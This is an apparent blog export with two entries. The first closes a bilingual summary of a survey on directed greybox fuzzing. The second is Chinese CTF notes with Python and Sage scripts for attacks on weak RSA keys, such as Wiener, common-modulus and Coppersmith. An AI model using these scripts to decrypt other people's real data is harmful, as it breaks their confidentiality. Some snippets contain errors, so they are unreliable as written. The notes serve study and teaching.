potential directed seeds. With this scheme, both of the two phases can coexist to achieve the best performance and adaptiveness. It worth noting that the thresholds in the algorithm are used to illustrate the principle. Reasonable values should be generated based on a heuristic algorithm. DGF面临的最后一个挑战是如何协调勘探与开发之间的权衡。一方面，多勘探可以为开发提供充分的信息，另一方面，勘探过度会占用大量资源，延缓开发。很难确定勘探阶段和开发阶段之间的界限。 AFLGo采用勘探阶段和开发阶段的固定分割。测试前，时间预算在测试配置中预先设置。这样的方案是初步的，因为分离点是经验性的和不灵活的。由于每个PUT具有不同的字符，因此这种固定拆分的适应性较差。一旦勘探阶段转入开发阶段，即使由于路径不足导致方向性能较差，也不会有回头路。 为了说明探索阶段和开发阶段的分配如何影响DGF的性能，论文作者在libxml上用AFLGo进行了一个简单的实验。使用AFLGo的“-z”参数为勘探阶段设置不同的时间预算，并比较其性能。如图3所示，水平坐标表示测试的持续时间，垂直坐标表示所有生成的输入到目标代码区域的最小距离。较小的最小距离表示定向性能更好。实验持续24小时，AFLGo-1意味着1小时的探索加上23小时的开发，其余的依此类推。从结果可以看出，勘探阶段和开发阶段的分配会影响DGF的性能，而最佳性能（AFLGo-16）需要两个阶段都有足够的时间。然而，很难得到一个最佳的分配。 在研究的有向模糊程序中，只有一项工作试图提高勘探开发的协调性。RDFuzz统计执行期间的分支级统计信息，以将代码区域分为高频区域和低频区域。根据频率和距离两个评价准则，将输入信号分为高、低距离和高、低频两类。低频输入有助于提高勘探所需的覆盖率；低距离输入有助于实现勘探所需的目标码区。最后，采用一个相互交织的测试时间表，交替进行勘探和开发。 解决这一难题的另一个可能方法是利用动态策略来协调勘探阶段和开发阶段的划分，该策略可以在勘探阶段和开发阶段之间自适应切换。为了实现这一方案，论文作者建议将模糊阶段的分配转化为种子的分配，即将种子分为两组：覆盖种子用于探索和定向种子用于开发。每组种子的数目表示在相应阶段所消耗的能量。这两个阶段的协调是通过控制每组种子的数量来实现的。使用一个称为dp的变量来表示所有种子中定向种子的百分比，这也表示花费在开发阶段上的能量的百分比。在种子评价过程中，对覆盖种子进行标记，在每个模糊周期后，对有向种子进行标记，并通过dp进行调整。 使用算法2来说明这个设计。具有自适应分裂的DGF应该从探索阶段（dp=0）开始，该阶段侧重于发现新路径。然后，随着已知路径的增加，逐渐增加dp来调用开发阶段，在开发阶段，基于dp选择高值的有向种子并对其进行优先级排序以增强可达性。当模糊测试程序在很长一段时间内找不到新的路径时，勘探阶段已经到了瓶颈，应该通过大幅度提高dp来迅速进入开发阶段。同样，也需要偶尔从开采阶段回到勘探阶段。例如，当模糊测试程序已经处于开采阶段，dp非常大（例如，dp&gt;0.9），但仍然无法在许多模糊循环中更接近目标，就应该大幅降低dp以返回勘探阶段。这是因为现有的定向种子性能较差，应该扩大路径覆盖范围以发现更多潜在的定向种子。在该方案中，两个阶段可以共存，以获得最佳的性能和自适应性。值得注意的是，算法中的阈值是用来说明原理的。应该基于启发式算法产生合理的阈值。 Discussion DGF是目前的研究热点。 With the rapid development of DGF, apart from target sites, various of indicators have been proposed to direct DGF, including target sequence, semantic information, typestate , sanitizer checks, memory usage, and vulnerable probability. DGF has evolved from reaching target locations to hunting complex deep behavioral bugs, such as used-after-free bugs, memory consumption bugs, memory violation bugs, and deep stateful bugs. Multi-targets Relationship Exploitation Although 86% (24/28) of the directed fuzzers we investigated support multi-targets, only 4 pay attention to the relationship among targets. When there are multiple targets, we can optimize DGF via the relationship among the targets. If they are unrelated, we can assign weights to them to differentiate the importance or probability. Otherwise, the hidden relationship can be extracted and exploited to improve directedness. For example, UAFL takes into account the operation sequence ordering when leverageing target sequence to find use-after-free vulnerabilities. This is because, to trigger such behavioral complex vulnerabilities, one needs not only to cover individual edges but also to traverse some long sequence of edges in a particular order. Such a method can be extended to detect semantic bugs, such as double-free and API misuse. Berry enhances the target sequences with execution context (i.e., necessary nodes required to reach the nodes in the target sequences) for all paths. Here we propose the following relationships that can be further included. The spatial relationship. The relative position of targets on the execution tree. Suppose we have two targets, we can consider the relationship including whether they are on the same execution path, how many execution paths are shared by them, and which one is the ancestor or the successor of the other. The stateful relationship. For targets that involve the program state, we could consider their position in the state space. For example, whether two targets share the same states, and whether two states can convert to each other on the state transition map. The interleaving relationship. For multi-threaded programs, the thread scheduling affects the execution ordering of events in different threads. Targets that can be reached under the same thread interleaving should be a close relationship in the interleaving space. Based on the above discussion, we recommend taking into account the relationship among targets when selecting and prioritizing targets. The targets with higher reachability should have higher priority. Targets with a closer relationship should be covered with fewer test runs. 虽然86%（24/28）的有向模糊测试程序支持多目标，但只有4个关注目标之间的关系。当存在多个目标时，可以通过目标之间的关系来优化DGF。如果它们是不相关的，可以给它们分配权重来区分重要性或概率。否则，可以提取隐藏关系并加以利用，以提高方向性。 UAFL在利用目标序列寻找UAF漏洞时，考虑了操作序列的顺序。这是因为，要触发这种行为复杂的漏洞，不仅需要覆盖单个边缘，还需要以特定顺序遍历一些长的边缘序列。这种方法可以扩展到检测语义错误，比如double-free和API误用。Berry使用所有路径的执行上下文（即到达目标序列中的节点所需的必要节点）增强目标序列。 在这里进一步提出以下关系。 空间关系。目标在执行树上的相对位置。假设有两个目标，可以考虑它们之间的关系，包括它们是否在同一个执行路径上，它们共享多少个执行路径，以及哪一个是另一个的前继节点还是后继节点。 有状态的关系。对于涉及程序状态的目标，可以考虑它们在状态空间中的位置。例如，两个目标是否共享相同的状态，以及两个状态是否可以在状态转换映射上相互转换。 交错关系。对于多线程程序，线程调度会影响不同线程中事件的执行顺序。在同一线程交织下可以达到的目标在交织空间中应该是一个密切的关系。 基于上述讨论，建议在选择目标和确定目标优先级时考虑目标之间的关系。具有较高可达性的目标应该有更高的优先级。关系更密切的目标应该用更少的测试运行来覆盖。 Technology Integration Owing to that, DGF depends on the random mutation to generate test inputs, it can hardly reach deep targets and is less effective at triggering deep bugs along complex paths. In order to enhance the directedness of reaching corner cases and flaky bugs, various program analysis techniques, such as static analysis, control-flow analysis, data-flow analysis, machine learning, semantic analysis, and symbolic execution, have been adopted (statistics are shown in Table 4). Among the tools we investigate, 75% of them rely on control-flow analysis to evaluate seeds and determine the reachability to the targets; 46% of them leverage static analysis to automatically identify targets and extract information from PUT; 32% use data-flow analysis (mainly taint analysis) to identify the relationship between the input and the critical program variables and optimize mutation strategy scheduling; 11% use machine learning to predict vulnerable code and filter out unreachable inputs; 18% adopt semantic analysis to identify vulnerable targets automatically and learn input fields semantics to optimize mutation; finally, 18% integrate symbolic (concolic) execution to solve complex path constraints. In a personal view, directed hybrid fuzzing is a promising direction that can leverage the precision of symbolic execution and the scalability of DGF to mitigate individual weaknesses. Directed fuzzing can prioritize and schedule input mutation to get closer to the targets rapidly, and directed symbolic execution can help to reach more in-depth code guarded by sophisticated checks on the execution traces from program entry to the targets. Nevertheless, we should be aware that anti-fuzzing techniques can insert fake paths, add delays in error-handling code, and obfuscate codes to slow down dynamic analyses such as symbolic execution and taint analysis. 正因为如此，DGF依赖于随机变异来产生测试输入，它很难到达深层目标，并且在复杂路径上触发深层缺陷的效果较差。为了增强到达角落案例和片状缺陷的方向性，采用了各种程序分析技术，如静态分析、控制流分析、数据流分析、机器学习、语义分析和符号执行（统计数据如表4所示）。 在我们调查的工具中，75%的工具依赖于控制流分析来评估种子并确定对目标的可达性；46%的工具利用静态分析来自动识别目标[30]，并从PUT中提取信息[12，42]；32%的工具使用数据流分析（主要是污点分析）来识别目标之间的关系输入和关键程序变量[27，44，47]，优化变异策略调度[28，46]；11%使用机器学习预测易受攻击的代码[32]，过滤掉无法到达的输入[54]；18%采用语义分析自动识别易受攻击目标[25，26，50]，学习输入字段语义优化变异；最后，18%集成符号（concolic）执行来解决复杂的路径约束[24，26，30，44]。在个人看来，定向混合模糊是一个很有前途的方向，它可以利用符号执行的精确性和DGF的可伸缩性来缓解个人的弱点。有向模糊化可以对输入变异进行排序和调度，使其快速接近目标，而有向符号执行可以通过对从程序进入到目标的执行轨迹进行复杂的检查，帮助获得更深入的代码。然而，我们应该意识到，反模糊技术[65，66]可以插入假路径，在错误处理代码中增加延迟，并模糊代码以减慢动态分析，如符号执行和污染分析[51]。 Implementation Limitation According to Table I, about 57% (16/28) of the tools are implemented on top of AFL. Thus, the performance is, to some extent, limited by the implementation of AFL. We illustrate such limitation from two aspects. Since the edge coverage of AFL is based on the basic block transitions, thus, it is only sensitive at the basic block level and cannot distinguish the path difference at the instruction level. Figure 5 shows an example of a jump between two nearby basic blocks. Since a traditional control-flow graph is only path-sensitive at the basic block level, we cannot differentiate whether the jump at address 0x400657 is taken (path 2) or not (path 1) because there will be the same edge in the controlflow graph, namely 0x400657 → 0x400671. Thus, general basic block level control-flow graph is not sensitive enough to precisely reflect the code coverage at the instruction level. Another problem lies in the path collision. AFL inserts random numbers for each branch jump at compile-time and collects these inserted numbers from the register at run-time to identify the basic block transition (i.e., the edge in the controlflow graph). Then it maps such transitions to a 64KB bitmap by cur location ∧ (prev location &gt;&gt; 1)]. This scheme incurs path collision because different edges might have the chance to share the same location. Both of the two limitations of AFL can import imprecision to the control-flow graph, which eventually affect the seed prioritization based on the control-flow graph analysis, no matter it is based on distance or other metrics. Although such limitation can be alleviated by constructing finer-grained controlflow graph or designing a customized hash scheme, however, additional work inevitably increases the runtime overhead. Thus, the implementation is essentially a tradeoff between the effectiveness and the efficiency. 根据表一，大约57%（16/28）的工具是在AFL之上实现的。因此，性能在一定程度上受到AFL实现的限制。从两个方面来说明这种局限性。 第一个问题在于，AFL的边缘覆盖是基于基本块转换的，因此它只在基本块级敏感，不能在指令级区分路径差异。图5显示了两个相邻基本块之间的跳转示例。由于仅对路径敏感，因此无法区分地址0x400657处的跳转是采用（路径2）还是不采用（路径1），因为在控制流图中会有相同的边，即0x400657→0x400671。 另一个问题在于，AFL在编译时为每个分支跳转插入随机数，并在运行时从寄存器中收集这些插入数，以标识基本块转换（即控制流图中的边）。然后通过一个算法将插入数转换映射到64KB位图。由于不同的边可能有机会共享同一位置，因此该方案会导致路径冲突。 AFL的这两个局限性都会导致控制流图的不精确性，最终影响基于控制流图分析的种子优先级，无论是基于距离还是其他度量。尽管这种限制可以通过构造更细粒度的控制流图或设计定制的哈希方案来缓解，但是，额外的工作不可避免地会增加运行时开销。 Efficiency Improvement As we have discussed in last subsection, in order to realize directedness in fuzzing, most researchers use additional instrumentation and data analysis. However, such additional analysis inevitably incurs performance deduction. For the evaluation, researchers usually focus on the ability to reach targets, using metric such as Time-to-Exposure (the length of the fuzzing campaign until the first testcase that exposes a given error) to measure the performance of directed greybox fuzzers, while ignoring the run-time overhead. However, for a given fuzzing time budget, higher efficiency means more fuzzing executions and, consequently, more chance to reach the target. Thus, optimize fuzzing efficiency is another direction to improve the directedness. One solution is moving the execution-independent computation from run-time to compile-time. For example, AFLGo measures the distance between each basic block and a target location by parsing the call graph and intra-procedure control-flow graph of the PUT. Since both parsing graphs and calculating distances are very time consuming, AFLGo moves most of the program analysis to the instrumentation phase at compile-time in exchange for efficiency at run-time. Another optimization is at the implementation level. Since most of the data we use during the analysis is graph-based, how such metadata is stored and accessed is vital to the efficiency. We can design an optimized data structure to store such data, which should facilitate the frequent and quick access to the data when searching based on the topological structure of the graph. For example, using the graph database model. Finally, we can leverage parallel computing to improve efficiency further. Prior works [69, 70] have successfully applied parallelism to CGF but not yet to DGF. For DGF, we can use a central node to maintain a seed queue that holds and prioritizes all the seeds for DGF. Then, distributing the seeds to parallel fuzzing instances on computational nodes to test the PUT and collect feedback information. 为了实现模糊化的方向性，大多数研究人员使用额外的工具和数据分析。然而，这种额外的分析不可避免地会导致性能降低。对于性能的评估，研究人员通常侧重于达到目标的能力，使用诸如暴露时间（暴露给定错误的第一个测试用例之前的模糊测试实践长度）等来衡量定向灰盒模糊程序的性能，而忽略了运行时开销。然而，对于给定的模糊时间预算，更高的效率意味着更多的模糊执行，因此，更多的机会达到目标。因此，优化模糊化效率是提高方向性的另一个方向。 一种解决方案是将与执行无关的计算从运行时转移到编译时。例如，AFLGo通过解析PUT的调用图和过程内控制流图来度量每个基本块与目标位置之间的距离。由于解析图和计算距离都非常耗时，AFLGo在编译时将大部分程序分析转移到插桩阶段，以换取运行时的效率。 另一个优化是在实现级别。由于在分析过程中使用的大多数数据都是基于图形的，因此如何存储和访问此类元数据对效率至关重要。可以设计一个优化的数据结构来存储这些数据，这样在基于图的拓扑结构进行搜索时就可以方便地频繁、快速地访问这些数据。例如，使用图形数据库模型。最后，可以利用并行计算来进一步提高效率。以前的工作已经成功地将并行性应用于CGF，但尚未应用于DGF。对于DGF，可以使用一个中心节点来维护一个种子队列，该队列保存DGF的所有种子并对其进行优先级排序。然后，将种子分发到计算节点上的并行模糊实例中，测试PUT并收集反馈信息。 Future research suggestions Based on the assessment and analysis of known works, we point out the following directions for future research. Among the tools we evaluated, only one (SemFuzz) of them supports kernel code testing. Thus, introducing DGF to kernel code and guiding fuzzing towards critical sites such as syscalls and error handling codes should be a productive direction. Although DGF has been trying to discover new bug types, such as use-after-free and memory consumption bugs, many commonly seen bugs have not been included yet. Thus, another research direction is applying DGF to specific bug types, such as information leakage bugs, concurrency bugs, semantic bugs (TOCTTOU, double fetch). As for the seed prioritization metric, most of the works leverage distance and coverage (similarity) based methods, which facilitate quantitive seed evaluation without introducing much overhead. However, a smaller distance or broader coverage does not necessarily mean closer to the target owing to the differentiated weight reason (discussed in Section IV-C) and global deviation reason (discussed in Section IV-D). We argue that probabilitybased metrics should be more reasonable. Finally, staged fuzzing is a feasible approach that can be further exploited for DGF. By dividing the path to the target into sequential stages, staged directed fuzzing can get to the target step by step by reaching the sub-target in each stage. Moreover, we can leverage different fuzzing strategies to satisfy the requirements in different stages. For example, TOFU uses syntacticfuzzing for command-line flags and semantic-fuzzing for primary input files. Thus, staged fuzzing can reduce the dimensionality of the input space for each individual stage of fuzzing and improve fuzzing efficiency. 在论文作者评估的工具中，只有SemFuzz支持内核代码测试。因此，在内核代码中引入DGF，并引导对关键站点（如syscalls和错误处理代码）的模糊化应该是一个有效的方向。 虽然DGF一直在尝试发现新的bug类型，比如UAF漏洞和内存泄漏漏洞，但许多常见的bug还没有被包括在内。因此，另一个研究方向是将DGF应用于特定的bug类型，如信息泄漏bug、并发bug、语义bug（TOCTTOU、double fetch）。 对于种子优先级度量，大多数工作都利用了基于距离和覆盖率（相似性）的方法，这有助于在不引入太多开销的情况下对种子进行量化评估。然而，较小的距离或较宽的覆盖范围并不一定意味着更接近目标，因为存在不同的权重原因和全局偏差原因。作者认为基于概率的度量应该更合理。 最后，分阶段模糊测试是一种可行的方法，可以进一步用于DGF。通过将到达目标的路径划分为连续的多个阶段，分阶段定向模糊算法可以在每个阶段到达子目标，逐步到达目标。此外，可以利用不同的模糊策略来满足不同阶段的需求。例如，TOFU对命令行标志使用语法模糊，对主要输入文件使用语义模糊。因此，分阶段模糊化可以降低模糊化各个阶段输入空间的维数，提高模糊化效率。 Conclusions Directed greybox fuzzing is a practical and scalable approach to software testing under specific scenarios, such as patch testing and bug reproduction. The modern DGF has evolved from reaching target locations to hunting complex deep behavioral bugs. However, DGF still faces challenges, including binary code support, automatic target identification, differentiated weight metric, global optimum deviation, missing indirect calls, and exploration-exploitation coordination. According to the assessment, we suggest paying more attention to apply differentiated weight in seed prioritization, to overcome the global optimum deviation, to exploit the relationship among targets, and to coordinate the splitting of the exploration phase and the exploitation phase. We also point out research directions for future work.]]></content>
      <categories>
        <category>IS</category>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>fuzz</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IS-crypto-非对称加密-RSA的攻击方式]]></title>
    <url>%2Fposts%2F2cb5ce06%2F</url>
    <content type="text"><![CDATA[明文攻击 小明文攻击 明文过小,导致明文的\(e\)次方仍然小于\(n\)(或者大不了多少),这种情况直接对密文\(e\)次开方(或者爆破\(k\)加\(kn\)后\(e\)次开方),即可得到明文. 分段加密明文 如果每段长度字节数很小,也就是说明文空间太小,就可以直接爆破生成表. 分解N 暴力分解 在\(N\)的比特位数小于\(512\)的时候,可以采用大整数分解的策略获取\(p\)和\(q\).网站分解. p&amp;q不当 当\(|p-q|\)很大时,一定存在某一个参数较小,可以通过穷举的方法对模数进行试除. 当\(|p-q|\)很小时.\(\frac{(p + q)^2}{4} - n = \frac{(p + q)^2}{4} - pq = \frac{(p - q)^2}{4}\). 说明\(\frac{p + q}{2}\)接近\(\sqrt{n}\),从而找出\(\frac{p + q}{2}\)和\(\frac{p - q}{2}\).然后分解出\(p\),\(q\). 在\(p\),\(q\)的取值差异过大,或者\(p\),\(q\)的取值过于相近的时候,Format方法与Pollard rho方法都可以很快将\(n\)分解成功.此类分解方法有一个开源项目\(yafu\)将其实现了. p+1/p-1光滑 光滑数指可以分解为小素数乘积的正整数,当\(p-1/p+1\)是光滑数的时候,可能可以使用Pollard's p − 1算法或者Williams's p + 1算法来分解\(N\). 首先\(a^{t(p-1)} - 1 = k * p\).根据Pollard’s p - 1算法:如果\(p-1\)是一些很小质数的乘积,那么\(n!\)就能被\(p-1\)整除,即\(n! = t(p-1)\). 对于每一个\(n = 2, 3, 4, ...\),任意选择一个底数\(a\),并计算:\(gcd(a^{n!} - 1, N)\),如果结果不为1或\(N\),那么就已成功分解\(N\). \[ a^{n!} \bmod N = \begin{cases} (a \bmod N) ^ 2 \bmod N &amp; \text{n = 2} \\ (a^{(n-1)!} \bmod N) ^ n \bmod N &amp; \text{n &gt;= 3}\\ \end{cases} \] 1234567891011import gmpy2def Pollards_p_1(N): a = 2 n = 2 while True: a = pow(a, n, N) p = gmpy2.gcd(a - 1, N) if p != 1 and p != N: return p n += 1 q = next_prime(t * p) 当\(q\)是\(p\)的\(t\)倍的后几个素数,甚至\(q\)就是\(p\)的后几个素数,可以在较短时间内分解\(n\). \[ \begin{align} q = tp + k\\ n = pq = p(tp + k) = tp^2 + pk\\ tp^2 + kp - n = 0\\ p = \frac{-k + \sqrt{k^2 + 4tn}}{2t}\\ \end{align} \] 由于\(p\)是整数,所以\(\sqrt{k^2 + 4tn}\)是整数,即\(k^2 + 4tn\)开方后是整数. \[ \begin{aligned} p &amp; = \frac{-k + \sqrt{k^2 + 4tn}}{2t}\\ q &amp; = tp + k\\ \end{aligned} \] 如果\(pq == n\),那么已成功分解.否则继续寻找\(k\). 123456789def factor(): n_4t = n * 4 * t for k in range(100000): delta = k ** 2 + n_4t if gmpy2.iroot(delta, 2)[1]: p = (-k + gmpy2.iroot(delta, 2)[0]) / (2 * t) q = t * p + k if p * q == n: return p, q 模不互素 n1,n2 当存在两个公钥的\(N\)不互素时,显然可以直接对这两个数求最大公因数(最大公因数为其中一个的\(p\)或者\(q\)),然后直接获得两对\(p\),\(q\),进而获得相应的私钥. c1,c2,c3,c4,... 123456789101112131415from Crypto.Util.number import size,bytes_to_long,getStrongPrimefrom itertools import combinationsmsg = bytes_to_long("Your secret flag is : flag&#123;**************************&#125;")e = 65537pri = []f = open('cipherx.txt', 'w')for i in range(5): pri.append(getStrongPrime(1024,65537))for k in combinations(pri, 2): n = k[0] * k[1] print k[0],k[1] f.write(str(pow(msg, e, n)) + '\n') 1234567891011import primefacimport gmpy2import libnum# c1, c2, c3, c4, c5, c6, c7 = ......e = 65537k1 = primefac.gcd(abs(c1 - c2), abs(c2 - c3))k2 = primefac.gcd(abs(c5 - c6), abs(c6 - c7))n = k1 * k2phi = (k1 - 1) * (k2 - 1)d = gmpy2.invert(e, phi)print libnum.n2s(pow(c1, d, n)) 多素因子 如果选取两个以上的素数,记为\(p_1, p_2, p_3, \cdots\),相乘得到\(n\). \[ \varphi (n) = (p_1 - 1)(p_2 - 1)(p_3 - 1)\cdots\\ \] 公钥,私钥,加解密都与一般RSA相同. 共模攻击 不同的\(e\)和\(d\)共用一个模数\(N\),会导致不用分解\(N\)就能恢复明文.假设\(m\)为信息明文,加密密钥为\(e1\)和\(e2\),公共模数为\(N\). 12c1 = pow(m, e1, n)c2 = pow(m, e2, n) \(e_1\),\(e_2\),\(c_1\),\(c_2\),\(N\)是公开的.用扩展欧几里得算法求出满足\(re1 + se2 = 1\)的两个整数\(r\)和\(s\). \[ \begin{align} c_1^rc_2^s &amp;\equiv m^{re_1}m^{se_2} \bmod n\\ &amp;\equiv m^{re_1 + se_2} \bmod n\\ &amp;\equiv m \bmod n\\ \end{align} \] 假如其中有一个为负数(最多一个为负数),则需要进行处理. 1234567891011121314151617def egcd(a, b): if a == 0: return b, 0, 1 else: g, y, x = egcd(b % a, a) return g, x - b // a * y, yrs = egcd(e1, e2)r = rs[0]s = rs[1]# 求模反元素if r &lt; 0: r = -r c1 = invert(c1, n)elif s &lt; 0: s = -s c2 = invert(c2, n)m = pow(c1, s1, N) * pow(c2, s2, N) % N 低加密指数攻击 \(e\)特别小的情况下.已知: \[ \begin{align} c &amp;\equiv m^{e} \pmod N\\ m^e &amp;= c + kN\\ m &amp;= \sqrt[e]{c + kN}\\ \end{align} \] 攻击者可以从小到大枚举\(k\). 123456789from Crypto.Util.number import *from gmpy2 import irootdef smallEattack(c, e, n): for i in range(10 ** 10): res = iroot(n * i + c, e) if res[1]: print(res) break 低加密指数广播攻击 \[ \begin{align} c_1 &amp;\equiv m^e mod n_1\\ c_2 &amp;\equiv m^e mod n_2\\ c_3 &amp;\equiv m^e mod n_3\\ \end{align} \] 假设n1,n2,n3互素,否则可计算最大公约数直接得到p,q`,根据中国剩余定理,在\(e = 3\)时,可以得到:\(c_x\equiv m^3 mod n_1 n_2 n_3\),通过对\(c_x\)进行三次开方就可以求得明文. 12345678from CRT import chinese_remainderfrom gmpy2 import iroot# datas = ...nList = [x[1] for x in datas]cList = [x[2] for x in datas]print(iroot(chinese_remainder(nList, cList), datas[0][0])) d泄露攻击 当获得了一次加密中的\(d\),不仅可以解密本次加密的数据,还可以对模数\(N\)进行分解. \[ \begin{align} ed &amp;\equiv 1 \pmod{\phi(n)}\\ ed - 1 &amp;= k\phi(n)\\ \end{align} \] \(\forall a \in \mathbb{Z}^*_n\),满足\(a^{ed-1} \equiv 1 \pmod{n}\). 令:\(ed - 1 = 2^st\),\(t\)是一个奇数.对于至少一半的\(a \in \mathbb{Z}^*_n\),存在一个\(i \in [1, s]\),使得:\(a^{2^{i-1}t} \not\equiv \pm 1 \pmod{n}, 2^{2^it} \equiv 1 \pmod{n}\)(二次剩余相关定理). 如果\(a\),\(i\)满足上述条件,则\(gcd(a^{2^{i-1}t} - 1, n)\)是\(n\)的一个非平凡因子(也就是\(p,q\)之一),所以可以对\(n\)进行暴力破解. 1234567891011121314151617181920212223242526272829import randomdef gcd(a, b): if a &lt; b: a, b = b, a while b != 0: temp = a % b a = b b = temp return adef getpq(n, e, d): p = 1 q = 1 while p == 1 and q == 1: k = d * e - 1 g = random.randint(0, n) while p == 1 and q == 1 and k % 2 == 0: k /= 2 y = pow(g, k, n) if y != 1 and gcd(y - 1, n) &gt; 1: p = gcd(y - 1, n) q = n / p return p, qn = 0xa66791dc6988168de7ab77419bb7fb0c001c62710270075142942e19a8d8c51d053b3e3782a1de5dc5af4ebe99468170114a1dfe67cdc9a9af55d655620bbabe = 0x10001d = 0x123c5b61ba36edb1d3679904199a89ea80c09b9122e1400c09adcf7784676d01d23356a7d44d6bd8bd50e94bfc723fa87d8862b75177691c11d757692df8881p, q = getpq(n, e, d) 低解密指数攻击 Wiener Attack 如果满足:\(d&lt;\frac{1}{3}N^\frac{1}{4}\)和\(q &lt; p &lt; 2p\),就可以通过Wiener Attack分解\(n\). 123456789101112131415161718192021222324252627282930313233343536373839404142import gmpy2def Simplify(ctnf):# 连分数化简 numerator = 0 denominator = 1 for x in ctnf[::-1]: numerator, denominator = denominator, x * denominator + numerator return (numerator, denominator)def continuedFra(x, y):# 展开为连分数 cF = [] while y: cF += [x / y] x, y = y, x % y return cFdef calculateFrac(x, y):# 生成d,k的估计值 cF = continuedFra(x, y) cF = map(Simplify, (cF[0:i] for i in xrange(1, len(cF)))) return cFdef solve_pq(a, b, c):# 解韦达定理,已知p+q和n求p,q.# (p-q)^2 = (p+q)^2 - 4n. par = gmpy2.isqrt(b * b - 4 * a * c) return (-b + par) / (2 * a), (-b - par) / (2 * a)def wienerAttack(e, n): for (d, k) in calculateFrac(e, n): if k == 0: continue if (e * d - 1) % k != 0: continue phi = (e * d - 1) / k p, q = solve_pq(1, n - phi + 1, n) #n - phi + 1 = p + q if p * q == n: return abs(int(p)), abs(int(q)) print 'not find!'p, q = wienerAttack(e, n) 工具:https://github.com/pablocelayes/rsa-wiener-attack. 123456789Bob is extremely paranoid, so he decided that just one RSA encryption is not enough. Before sending his message to Alice, he forced her to create 5 public keys so he could encrypt his message 5 times! Show him that he still is not secure.Here are the 5 public keys that Bob used, each in the format of (N, e):(9247606623523847772698953161616455664821867183571218056970099751301682205123115716089486799837447397925308887976775994817175994945760278197527909621793469, 11)(9247606623523847772698953161616455664821867183571218056970099751301682205123115716089486799837447397925308887976775994817175994945760278197527909621793469, 41)(9247606623523847772698953161616455664821867183571218056970099751301682205123115716089486799837447397925308887976775994817175994945760278197527909621793469, 67623079903)(9247606623523847772698953161616455664821867183571218056970099751301682205123115716089486799837447397925308887976775994817175994945760278197527909621793469, 5161910578063)(9247606623523847772698953161616455664821867183571218056970099751301682205123115716089486799837447397925308887976775994817175994945760278197527909621793469, 175238643578591220695210061216092361657427152135258210375005373467710731238260448371371798471959129039441888531548193154205671)Here is his encrypted message:7117565509436551004326380884878672285722722211683863300406979545670706419248965442464045826652880670654603049188012705474321735863639519103720255725251120 12345678910111213141516171819import ContinuedFractions, Arithmetic, RSAvulnerableKeyGeneratordef hack_RSA(e,n): frac = ContinuedFractions.rational_to_contfrac(e, n) convergents = ContinuedFractions.convergents_from_contfrac(frac) for (k, d) in convergents: if k != 0 and (e * d - 1) % k == 0: phi = (e * d - 1) // k s = n - phi + 1 discr = s * s - 4 * n if (discr &gt;= 0): t = Arithmetic.is_perfect_square(discr) if t != -1 and (s + t) % 2 == 0: print("Hacked!") return dc = 7117565509436551004326380884878672285722722211683863300406979545670706419248965442464045826652880670654603049188012705474321735863639519103720255725251120e = e1 * e2 * e3 * e4 * e5 % n1d = hack_RSA(e, n1)m = pow(c, d, n1) Boneh and Durfee attack 当\(d\)较小时,满足\(\frac{1}{3}N^\frac{1}{4} \le d &lt; N^{0.292}\)时可以利用该攻击. https://github.com/mimoo/RSA-and-LLL-attacks/blob/master/boneh_durfee.sage. Coppersmith相关攻击 \(Coppersmith\)定理:在一个e阶的mod n多项式f(x)中,如果有一个根小于\(n^frac{1}{e}\).就可以运用一个O(log n)的算法求出这些根. Known high in plaintext 12345678e = 0x3b = 0x9e67d3a220a3dcf6fc4742052621f543b8c78d5d9813e69272e65ac676672446e5c88887e8bfdfc92ec87ec74c16350e6b539e3bd910b000000000000000000n = 0xa1888c641a05aeb81b3d1686317a86f104791fe1d570a5b11209f45d09ea401d255a70744e7a2d39520e359c23a9f1209ee47f496dbd279e62ee1648b3a277ced8825298274322e0a7a86deea282676310a73b6bb946fc924c34ac6c8784ff559bf9a004c03fb167ef54aaea90ce587f2f3074b40d7f632022ec8fb12e659953c = 0x93145ece45f416a11e5e9475518f165365456183c361500c2f78aff263028c90f20b7d97205f54e21f3bcc8a556b457889fde3719d0a0f9c9646f3f0d0a1e4bee0f259f023168fe8cc0511848c1635022fcc20b6088084585e2f8055a9d1b1d6bdb228087900bf7c6d42298f8e45c451562c816e2303990834c94e580bf0cbd1kbits = 72PR.&lt;x&gt; = PolynomialRing(Zmod(n))f = (x + b)^e - cx0 = f.small_roots(X = 2^kbits, beta = 1)[0] Factoring with High Bits Known 当知道一个公钥中模数\(N\)的一个因子的较高位时,就有一定几率来分解\(N\). 12345678910n = 0x241ac918f708fff645d3d6e24315e5bb045c02e788c2b7f74b2b83484ce9c0285b6c54d99e2a601a386237d666db2805175e7cc86a733a97aeaab63486133103e30c1dca09741819026bd3ea8d08746d1d38df63c025c1793bdc7e38d194a30b492aadf9e31a6c1240a65db49e061b48f1f2ae949ac9e7e0992ed24f9c01578dp_fake = 0x2c1e75652df018588875c7ab60472abf26a234bc1bfc1b685888fb5ded29ab5b93f5105c1e9b46912368e626777a873200000000000000000000000000000000pbits = 1024kbits = 130pbar = p_fake &amp; (2^pbits - 2^kbits)PR.&lt;x&gt; = PolynomialRing(Zmod(n))f = x + pbarx0 = f.small_roots(X = 2^kbits, beta = 0.4)[0]#X – an absolute bound for the root (default: see above)#beta – compute a root mod b where b is a factor of N and b≥N^β Partial Key Exposure Attack 已知低位的\(d\)和\(N\). 1234567891011121314151617181920212223242526272829def partial_p(p0, kbits, n): PR.&lt;x&gt; = PolynomialRing(Zmod(n)) nbits = n.nbits() f = 2^kbits * x + p0 f = f.monic() roots = f.small_roots(X = 2^(nbits // 2 - kbits), beta = 0.3) if roots: x0 = roots[0] p = gcd(2 ^ kbits * x0 + p0, n) return ZZ(p)def find_p(d0, kbits, e, n): X = var('X') for k in xrange(1, e + 1): results = solve_mod([e * d0 * X - k * X * (n - X + 1) + k * n == X], 2^kbits) for x in results: p0 = ZZ(x[0]) p = partial_p(p0, kbits, n) if p: return pif __name__ == '__main__': e = 3 n = 57569201048993475052349187244752169754165154575782760003851777813767048953051839288528137121670999884309849815765999616346303792471518639080697166767644957046582385785721102370288806038187956032505761532789716009522131450217010629338000241936036185205038814391205848232364006349213836317806903032515194407739 nbits = n.nbits() kbits = floor(nbits * 0.5) d0 = 1244848677959253796774387650148978357579294769878147704641867595620534030329181934099194560059806799908134954814673426128260540575360296026444649631806619 p = find_p(d0, kbits, e, n) q = n//p print inverse_mod(e, (p - 1)) Coppersmith’s short-pad attack 待补充 dp&amp;dq泄露(RSA_CRT leaks) 12dp = d % (p - 1)dq = d % (q - 1) 